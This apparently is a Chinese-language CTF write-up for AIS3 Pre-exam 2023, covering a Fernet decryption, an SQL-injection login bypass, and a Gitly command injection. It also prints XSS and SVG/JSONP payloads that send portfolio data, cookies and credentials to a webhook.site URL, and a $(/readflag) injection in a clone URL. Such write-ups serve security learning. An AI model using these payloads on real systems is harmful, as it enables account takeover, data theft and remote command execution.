@@ -1,0 +1,376 @@
+---
+layout: post
+title: "[CTF] AIS3-Pre-exam-2023 Writeup"
+date: 2023-05-14 +0800
+categories: CTF
+hidden: false
+---
+
+# Misc
+## Welcome
+FLAG就在PDF
+![](/images/2023/05/bx50XkB.png)
+
+## Robot
+努力算數學，就有FLAG啦!
+![](/images/2023/05/3Y93ZDt.png)
+
+# Crypro
+## Fernet
+
+Source code
+
+```python
+import os
+import base64
+from cryptography.fernet import Fernet
+from Crypto.Hash import SHA256
+from Crypto.Protocol.KDF import PBKDF2
+from secret import FLAG
+
+def encrypt(plaintext, password):
+    salt = os.urandom(16)  
+    key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)  
+    f = Fernet(base64.urlsafe_b64encode(key))  
+    ciphertext = f.encrypt(plaintext.encode())  
+    return base64.b64encode(salt + ciphertext).decode()
+
+# Usage:
+leak_password = 'mysecretpassword'
+plaintext = FLAG
+
+# Encrypt
+ciphertext = encrypt(plaintext, leak_password)
+print("Encrypted data:",ciphertext)
+```
+
+decrypt
+
+```python
+import base64
+from cryptography.fernet import Fernet
+from Crypto.Hash import SHA256
+from Crypto.Protocol.KDF import PBKDF2
+
+def decrypt(ciphertext, password):
+    ciphertext = base64.b64decode(ciphertext.encode())
+    salt = ciphertext[:16]
+    ciphertext = ciphertext[16:]
+
+    key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)
+    f = Fernet(base64.urlsafe_b64encode(key))
+
+    plaintext = f.decrypt(ciphertext)
+    return plaintext.decode()
+
+# Usage:
+leak_password = 'mysecretpassword'
+encrypted_data = "iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj"  
+
+# Decrypt
+decrypted_data = decrypt(encrypted_data, leak_password)
+print("Decrypted data:", decrypted_data)
+```
+
+執行結果
+```
+Decrypted data: FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!_!!!_!}
+```
+
+# Web
+## Login Panel
+
+使用guest直接登入
+![](/images/2023/05/Vr2SoPx.png)
+
+發現有2FA
+![](/images/2023/05/K2XTmg9.png)
+
+需要使用admin登入
+![](/images/2023/05/ttAUKsm.png)
+
+### 解法
+
+回到登入頁面
+
+帳號: admin
+
+密碼: admin’ or ‘’=’
+
+直接進到http://chals1.ais3.org:8000/dashboard
+
+### 原因
+
+進入 /dashboard 前沒有驗證是否通過2FA
+
+上source code
+
+```
+const express = require('express')
+const session = require('express-session')
+const eta = require('eta')
+const crypto = require('crypto')
+const sqlite3 = require('sqlite3');
+
+// constants
+const ADMIN_PASSWORD = crypto.randomBytes(16).toString('hex')
+const FLAG = process.env.FLAG ?? 'AIS3{fake_flag}'
+const RECAPTCHA_SITE_KEY = process.env.RECAPTCHA_SITE_KEY || '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI'
+const RECAPTCHA_SECRET_KEY = process.env.RECAPTCHA_SECRET_KEY || '6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe'
+const PORT = process.env.PORT || 8000
+const ADMIN_2FA_CODE = crypto.randomInt(10000000000000, 100000000000000).toString()
+
+const Recaptcha = require('express-recaptcha').RecaptchaV2
+const recaptcha = new Recaptcha(RECAPTCHA_SITE_KEY, RECAPTCHA_SECRET_KEY)
+
+// configure Eta
+const app = express()
+app.engine('eta', eta.renderFile)
+eta.configure({ views: './views', cache: true })
+app.set('views', './views')
+app.set('view cache', true)
+app.set('view engine', 'eta')
+
+// configure express-session
+app.use(session({
+    secret: crypto.randomBytes(64).toString('hex'),
+    resave: false,
+    saveUninitialized: false,
+}))
+
+// receive data from forms
+app.use(express.urlencoded({ extended: true }))
+app.use(express.json())
+
+// db
+// const db = new sqlite3.Database('Login_Panel.db');
+const db = new sqlite3.Database(':memory:');
+db.serialize(() => {
+    db.run("CREATE TABLE IF NOT EXISTS Users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, code TEXT)");
+    db.run("INSERT INTO Users (username, password, code) VALUES ('admin', ?, ?)", ADMIN_PASSWORD, ADMIN_2FA_CODE);
+    db.run("INSERT INTO Users (username, password, code) VALUES ('guest', 'guest', '99999999999999')");
+});
+
+app.get('/', (req, res) => {
+    res.redirect('/login')
+})
+
+app.get('/login', (req, res) => {
+    res.render('login', {
+        msg: req.query.msg,
+        RECAPTCHA_SITE_KEY
+    })
+})
+
+app.post('/login', recaptcha.middleware.verify, (req, res) => {
+    const { username, password } = req.body
+    db.get(`SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'`, async (err, row) => {
+        if (err) return res.redirect(`https://www.youtube.com/watch?v=dQw4w9WgXcQ`)
+        if (!row) return res.redirect(`/login?msg=invalid_credentials`)
+        if (row.username !== username) {
+            // special case
+            return res.redirect(`https://www.youtube.com/watch?v=E6jbBLrxY1U`)
+        }
+        if (req.recaptcha.error) {
+            console.log(req.recaptcha.error)
+            return res.redirect(`/login?msg=invalid_captcha`)
+        }
+        req.session.username = username
+        return res.redirect('/2fa')
+    })
+})
+
+app.get('/2fa', (req, res) => {
+    if (req.session.username) {
+        return res.render('2fa', {
+            msg: req.query.msg
+        })
+    }
+    return res.redirect('/login')
+})
+
+app.post('/2fa', (req, res) => {
+    if (req.session.username) {
+        const { code } = req.body
+        db.get(`SELECT code FROM Users WHERE username = '${req.session.username}'`, (err, row) => {
+            if (err)
+                return res.redirect(`https://www.youtube.com/watch?v=dQw4w9WgXcQ`)
+            if (row.code === code)
+                return res.redirect('/dashboard')
+            return res.redirect('/2fa?msg=invalid_code')
+        })
+    } else {
+        return res.redirect('/login')
+    }
+})
+
+app.get('/dashboard', (req, res) => {
+    if (req.session.username) {
+        return res.render('dashboard', {
+            username: req.session.username,
+            flag: FLAG
+        })
+    }
+    return res.redirect('/')
+})
+
+app.get('/logout', (req, res) => {
+    req.session.destroy()
+    res.redirect('/')
+})
+
+process.on('SIGINT', function () {
+    db.close();
+    process.exit();
+});
+
+app.listen(PORT, () => {
+    console.log('listening to requests on port', PORT)
+})
+```
+
+
+## E-Portfolio baby
+
+登入後的頁面
+
+![](/images/2023/05/HkgWrN4.png)
+
+這題需要使用XSS去偷admin的資料，但不是偷cookie，所以這題比較少人解
+
+Payload
+
+```
+<img src=x onerror=fetch('/api/portfolio').then(r=&gt;{r.text().then(t=&gt;fetch('https://webhook.site/f25d50d9-9c87-4bce-8177-05a3360c5279/?='+btoa(t)))})>
+```
+
+![](/images/2023/05/A2tFSHS.png)
+
+if you want to steal cookie
+
+```
+<img src=x onerror=fetch('/api/portfolio').then(r=&gt;{r.text().then(t=&gt;fetch('https://webhook.site/f25d50d9-9c87-4bce-8177-05a3360c5279/?='+btoa(document.cookie),{'mode':'no-cors'}))})>
+```
+
+
+
+
+### 插曲
+有人直接使用admin/admin登入，所以http://url/share?username=admin，就有一堆假FLAG
+
+
+## E-Portfolio (事後解)
+
+關鍵點 : 用 svg 圖片進行 XSS / CSP JSONP
+
+網站有設定DOMPurify.sanitize以及X-Xss-Protection等
+
+其中可以使用 google 的 jsonp  ```https://accounts.google.com/o/oauth2/revoke?callback=```
+可以參考 [JSONBEE](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
+
+![](/images/2023/05/SGkC8hs.png)
+
+其中因為有些字元會被encode或閉合，像是 ``` " > ``` 之類的
+
+下方的程式過程是:
+1. 先透過```/api/portfolio```取得FLAG
+2. 使用```/api/login```登入自己的帳號
+3. 將帳號密碼寫入到自己的布告欄上
+
+```
+<svg xmlns="http://www.w3.org/2000/svg">
+	<script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio').then(function (r)
+{ return r.json() }).then(function (t)
+{ const USERAAA = (t.data.username);const PASSBBB = (t.data.password);
+fetch('/api/login', {
+    'headers': {
+      'content-type': 'application/json',
+    },
+    'referrer': 'http://127.0.0.1:1234/login',
+    'referrerPolicy': 'strict-origin-when-cross-origin',
+    'body': JSON.stringify({ username:'test', password: 'test' }),
+    'method': 'POST',
+    'mode': 'cors',
+    'credentials': 'include'
+  }).then(function(z)
+  { const formData = new FormData();
+	const leak = USERAAA.concat(PASSBBB);
+    formData.append('about', leak);
+  fetch('/api/portfolio', {
+    'referrer': 'http://127.0.0.1:1234/portfolio',
+    'referrerPolicy': 'strict-origin-when-cross-origin',
+    'body': formData,
+    'method': 'PUT',
+    'mode': 'cors',
+    'credentials': 'include'
+  })})})"></script>
+</svg>
+```
+
+效果大概是這樣
+
+![](/images/2023/05/OnBdVTc.png)
+
+方法2
+
+使用location.href 傳送flag (不受CSP限制)
+
+```
+<svg  width="400"
+  viewBox="0 0 400 300"
+  xmlns="http://www.w3.org/2000/svg"
+  xmlns:xlink="http://www.w3.org/1999/xlink">
+<script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio').then(function(a){return a.json()}).then(function(b){var aa = 'https://webhook.site/f25d50d9-9c87-4bce-8177-05a3360c5279/?flag='; aa= aa.concat(b.data.password);location.href=aa;})">
+</script>
+</svg>
+```
+
+需要修改report成那個svg
+
+![](/images/2023/05/s7MSif4.png)
+
+
+
+## Gitly
+一個Gitly網頁
+![](/images/2023/05/3IsmsMV.png)
+
+使用source code內的gitly.sqlite，裡面的token設定到cookie就能登入
+![](/images/2023/05/scQe2IP.png)
+
+但裡面功能好像都用不了
+![](/images/2023/05/gbI89f4.png)
+
+只有New repository，能發出請求
+![](/images/2023/05/N9yzXwt.png)
+
+結果嘗試到後面發現是command injection
+
+接收端需先設定，讓gitly覺得是真的git
+
+Status code 設定為
+```
+200
+```
+
+Content Type 設定為
+```
+application/x-git-upload-pack-advertisement
+```
+
+Response body 設定為
+```
+001e# service=git-upload-pack
+```
+
+接收端設定完後，在Clone URL 輸入
+
+
+https://webhook.site/3923ff74-968d-46db-bb20-727f2068df0e/$(/readflag);
+
+![](/images/2023/05/M1F2ghg.png)
+
+# 結束
+
+解出Web三題，其他Reverse,Pwn都不會QQ
+![](/images/2023/05/tAFddYC.png)
